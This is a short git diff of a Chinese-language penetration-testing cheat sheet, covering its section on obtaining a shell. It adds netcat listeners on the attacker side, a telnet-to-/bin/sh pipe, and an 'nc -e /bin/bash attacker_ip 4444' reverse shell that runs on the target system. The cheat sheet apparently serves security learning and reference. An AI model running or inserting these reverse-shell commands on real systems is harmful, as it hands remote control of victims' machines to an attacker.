@@ -167,10 +167,22 @@ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
 ### 你如何get一个shell？你如何与系统进行交互？
 
 ```
+[1]:
 # http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
-nc -lvp 4444    # Attacker. 输入 (命令)
-nc -lvp 4445    # Attacker. 输出(结果)
-telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # 在目标系统上. 使用 攻击者的IP!
+
+# Attacker. 输入 (命令)
+nc -lvp 4444    
+# Attacker. 输出(结果)
+nc -lvp 4445    
+# 在目标系统上. 使用 攻击者的IP!
+telnet [attacker's ip] 44444 | /bin/sh | [local ip] 44445
+
+[2]:
+# Attacker 输入命令，输出结果
+nc -lvp 4444  
+
+# 目标系统
+nc -e /bin/bash attacker_ip 4444
 ```
 
 ### 如何端口转发？（端口重定向）
